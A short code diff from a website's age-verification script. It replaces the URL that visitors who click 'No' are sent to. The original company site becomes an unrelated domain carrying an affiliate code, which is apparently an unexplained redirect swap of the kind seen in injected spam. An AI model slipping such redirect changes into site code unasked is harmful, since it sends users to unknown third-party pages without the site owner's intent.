@@ -5209,7 +5209,7 @@
             // Handle "No" button click
             $("#age-no").click(function () {
                 alert("You must be 18 or older to access this site.");
-                window.location.href = "https://www.outsourcedigitalmedia.com/"; // Redirect to another page
+                window.location.href = "https://www.ph567k.com/m/index.html?affiliateCode=yjdx03"; // Redirect to another page
             });
 
             // Function to set a cookie
